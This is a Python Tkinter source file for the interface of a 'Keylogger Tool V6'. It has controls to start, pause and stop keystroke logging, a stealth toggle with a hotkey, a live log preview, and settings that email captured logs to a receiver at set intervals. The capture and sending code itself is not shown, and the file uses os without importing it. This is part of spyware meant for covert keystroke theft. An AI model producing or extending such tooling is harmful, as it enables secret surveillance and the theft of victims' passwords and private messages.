import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from themes import Themes

class KeyloggerGUI:
    def __init__(self, root, app):
        self.root = root
        self.app = app
        self.themes = Themes()
        self.root.title("Keylogger Tool V6")
        self.root.geometry("900x800")
        self.setup_gui()
        self.apply_theme()

    def setup_gui(self):
        self.main_frame = ttk.Frame(self.root, padding="10")
        self.main_frame.pack(fill=tk.BOTH, expand=True)

        # Title
        self.title_label = ttk.Label(self.main_frame, text=" Keylogger Tool V6", font=("Consolas", 20, "bold"))
        self.title_label.pack(pady=10)

        # Window controls
        self.window_frame = ttk.Frame(self.main_frame)
        self.window_frame.pack(fill=tk.X)
        self.fullscreen_button = ttk.Button(self.window_frame, text="Fullscreen", command=self.toggle_fullscreen)
        self.fullscreen_button.pack(side=tk.LEFT, padx=5)
        self.minimize_button = ttk.Button(self.window_frame, text="Minimize", command=self.minimize)
        self.minimize_button.pack(side=tk.LEFT, padx=5)
        self.halfscreen_button = ttk.Button(self.window_frame, text="Half Screen", command=self.toggle_halfscreen)
        self.halfscreen_button.pack(side=tk.LEFT, padx=5)

        # Control buttons
        self.control_frame = ttk.Frame(self.main_frame)
        self.control_frame.pack(fill=tk.X, pady=5)
        self.start_button = ttk.Button(self.control_frame, text="Start Logging", command=self.app.start_logging)
        self.start_button.pack(side=tk.LEFT, padx=5)
        self.stop_button = ttk.Button(self.control_frame, text="Stop Logging", command=self.app.stop_logging, state="disabled")
        self.stop_button.pack(side=tk.LEFT, padx=5)
        self.pause_button = ttk.Button(self.control_frame, text="Pause Logging", command=self.app.pause_logging, state="disabled")
        self.pause_button.pack(side=tk.LEFT, padx=5)
        self.stealth_button = ttk.Button(self.control_frame, text="Toggle Stealth", command=self.app.toggle_stealth)
        self.stealth_button.pack(side=tk.LEFT, padx=5)

        # Log preview
        self.preview_frame = ttk.Frame(self.main_frame)
        self.preview_frame.pack(pady=5, fill=tk.BOTH, expand=True)
        self.preview_label = ttk.Label(self.preview_frame, text="Real-Time Log Preview:", font=("Consolas", 12))
        self.preview_label.pack(pady=5)
        self.preview_text = scrolledtext.ScrolledText(self.preview_frame, height=15, width=80, state="disabled", font=("Consolas", 12))
        self.preview_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(self.preview_frame, command=self.preview_text.yview, cursor="hand2")
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.preview_text.configure(yscrollcommand=scrollbar.set, bg="#000000", fg="#ff0000", relief=tk.RAISED, borderwidth=3)

        # Search bar
        self.search_frame = ttk.Frame(self.main_frame)
        self.search_frame.pack(fill=tk.X, pady=5)
        self.search_label = ttk.Label(self.search_frame, text="Search Logs:")
        self.search_label.pack(side=tk.LEFT, padx=5)
        self.search_entry = ttk.Entry(self.search_frame, width=50)
        self.search_entry.pack(side=tk.LEFT, padx=5)
        self.search_button = ttk.Button(self.search_frame, text="Search", command=self.app.logger.search_logs)
        self.search_button.pack(side=tk.LEFT, padx=5)

        # Settings
        self.settings_frame = ttk.LabelFrame(self.main_frame, text="Settings", padding="10")
        self.settings_frame.pack(fill=tk.X, pady=10)

        # General Settings
        self.general_frame = ttk.LabelFrame(self.settings_frame, text="General", padding="5")
        self.general_frame.pack(fill=tk.X, pady=5)
        self.folder_label = ttk.Label(self.general_frame, text="Log Folder:", font=("Consolas", 10))
        self.folder_label.grid(row=0, column=0, sticky="w", padx=5)
        self.folder_entry = ttk.Entry(self.general_frame, width=40, font=("Consolas", 10))
        self.folder_entry.insert(0, self.app.settings.config["log_folder"])
        self.folder_entry.grid(row=0, column=1, padx=5)
        self.folder_button = ttk.Button(self.general_frame, text="Browse", command=self.browse_folder)
        self.folder_button.grid(row=0, column=2, padx=5)
        self.auto_delete = tk.BooleanVar()
        self.auto_delete_check = ttk.Checkbutton(self.general_frame, text="Auto Delete Old Logs (7 days)", variable=self.auto_delete)
        self.auto_delete_check.grid(row=1, column=0, columnspan=3, sticky="w", pady=5)

        # Email Settings
        self.email_frame = ttk.LabelFrame(self.settings_frame, text="Email", padding="5")
        self.email_frame.pack(fill=tk.X, pady=5)
        self.email_enabled = tk.BooleanVar()
        self.email_check = ttk.Checkbutton(self.email_frame, text="Enable Email Alerts", variable=self.email_enabled, command=self.toggle_email_settings)
        self.email_check.grid(row=0, column=0, columnspan=3, sticky="w", pady=5)
        self.email_label = ttk.Label(self.email_frame, text="Your Email:", font=("Consolas", 10))
        self.email_label.grid(row=1, column=0, sticky="w", padx=5)
        self.email_entry = ttk.Entry(self.email_frame, width=40, font=("Consolas", 10))
        self.email_entry.grid(row=1, column=1, columnspan=2, padx=5)
        self.pass_label = ttk.Label(self.email_frame, text="Email Password:", font=("Consolas", 10))
        self.pass_label.grid(row=2, column=0, sticky="w", padx=5)
        self.pass_entry = ttk.Entry(self.email_frame, width=40, show="*", font=("Consolas", 10))
        self.pass_entry.grid(row=2, column=1, columnspan=2, padx=5)
        self.receiver_label = ttk.Label(self.email_frame, text="Receiver Email:", font=("Consolas", 10))
        self.receiver_label.grid(row=3, column=0, sticky="w", padx=5)
        self.receiver_entry = ttk.Entry(self.email_frame, width=40, font=("Consolas", 10))
        self.receiver_entry.grid(row=3, column=1, columnspan=2, padx=5)
        self.interval_label = ttk.Label(self.email_frame, text="Email Interval (sec):", font=("Consolas", 10))
        self.interval_label.grid(row=4, column=0, sticky="w", padx=5)
        self.interval_entry = ttk.Entry(self.email_frame, width=10, font=("Consolas", 10))
        self.interval_entry.insert(0, "300")
        self.interval_entry.grid(row=4, column=1, sticky="w", padx=5)

        # Advanced Settings
        self.advanced_frame = ttk.LabelFrame(self.settings_frame, text="Advanced", padding="5")
        self.advanced_frame.pack(fill=tk.X, pady=5)
        self.log_interval_label = ttk.Label(self.advanced_frame, text="Log Interval (sec):", font=("Consolas", 10))
        self.log_interval_label.grid(row=0, column=0, sticky="w", padx=5)
        self.log_interval_entry = ttk.Entry(self.advanced_frame, width=10, font=("Consolas", 10))
        self.log_interval_entry.insert(0, "30")
        self.log_interval_entry.grid(row=0, column=1, sticky="w", padx=5)
        self.sensitivity_label = ttk.Label(self.advanced_frame, text="Key Sensitivity:", font=("Consolas", 10))
        self.sensitivity_label.grid(row=1, column=0, sticky="w", padx=5)
        self.sensitivity_var = tk.StringVar(value="Normal")
        self.sensitivity_menu = ttk.OptionMenu(self.advanced_frame, self.sensitivity_var, "Normal", "High", "Low")
        self.sensitivity_menu.grid(row=1, column=1, sticky="w", padx=5)
        self.hotkey_label = ttk.Label(self.advanced_frame, text="Hotkeys (e.g., f12):", font=("Consolas", 10))
        self.hotkey_label.grid(row=2, column=0, sticky="w", padx=5)
        self.stealth_hotkey_entry = ttk.Entry(self.advanced_frame, width=10, font=("Consolas", 10))
        self.stealth_hotkey_entry.insert(0, self.app.settings.config["hotkeys"]["stealth"])
        self.stealth_hotkey_entry.grid(row=2, column=1, sticky="w", padx=5)
        self.pause_hotkey_entry = ttk.Entry(self.advanced_frame, width=10, font=("Consolas", 10))
        self.pause_hotkey_entry.insert(0, self.app.settings.config["hotkeys"]["pause"])
        self.pause_hotkey_entry.grid(row=2, column=2, sticky="w", padx=5)

        self.save_settings_button = ttk.Button(self.settings_frame, text="Save Settings", command=self.save_settings)
        self.save_settings_button.pack(pady=5)

        # Theme toggle
        self.theme_button = ttk.Button(self.main_frame, text="Toggle Theme", command=self.toggle_theme)
        self.theme_button.pack(pady=5)

        # Status
        self.status_label = ttk.Label(self.main_frame, text="Status: Idle", wraplength=700, font=("Consolas", 12))
        self.status_label.pack(pady=5)

    def apply_theme(self):
        self.themes.apply_theme(self.root, self.main_frame, self.preview_text)

    def toggle_theme(self):
        self.themes.toggle_theme()
        self.apply_theme()

    def toggle_fullscreen(self):
        self.root.attributes("-fullscreen", not self.root.attributes("-fullscreen"))
        self.fullscreen_button.configure(text="Exit Fullscreen" if self.root.attributes("-fullscreen") else "Fullscreen")

    def minimize(self):
        self.root.iconify()

    def toggle_halfscreen(self):
        current_height = self.root.winfo_height()
        if current_height == 800:
            self.root.geometry("900x400")
        else:
            self.root.geometry("900x800")

    def browse_folder(self):
        folder = filedialog.askdirectory()
        if folder:
            self.folder_entry.delete(0, tk.END)
            self.folder_entry.insert(0, folder)
            self.app.settings.config["log_folder"] = folder
            os.makedirs(self.app.settings.config["log_folder"], exist_ok=True)

    def toggle_email_settings(self):
        state = "normal" if self.email_enabled.get() else "disabled"
        for widget in [self.email_entry, self.pass_entry, self.receiver_entry, self.interval_entry]:
            widget.configure(state=state)

    def save_settings(self):
        self.app.settings.config["log_folder"] = self.folder_entry.get() or "logs"
        os.makedirs(self.app.settings.config["log_folder"], exist_ok=True)
        self.app.settings.config["email_config"]["enabled"] = self.email_enabled.get()
        self.app.settings.config["email_config"]["email"] = self.email_entry.get()
        self.app.settings.config["email_config"]["password"] = self.pass_entry.get()
        self.app.settings.config["email_config"]["receiver"] = self.receiver_entry.get()
        try:
            self.app.settings.config["email_config"]["interval"] = int(self.interval_entry.get())
        except ValueError:
            self.app.settings.config["email_config"]["interval"] = 300
        try:
            self.app.settings.config["log_interval"] = int(self.log_interval_entry.get())
        except ValueError:
            self.app.settings.config["log_interval"] = 30
        self.app.settings.config["hotkeys"]["stealth"] = self.stealth_hotkey_entry.get() or "f12"
        self.app.settings.config["hotkeys"]["pause"] = self.pause_hotkey_entry.get() or "f11"
        if self.auto_delete.get():
            self.app.logger.delete_old_logs()
        self.app.restart_hotkey_listener()
        self.app.settings.save()
        messagebox.showinfo("Success", "Settings saved.")

    def update_status(self, status):
        self.status_label.configure(text=status)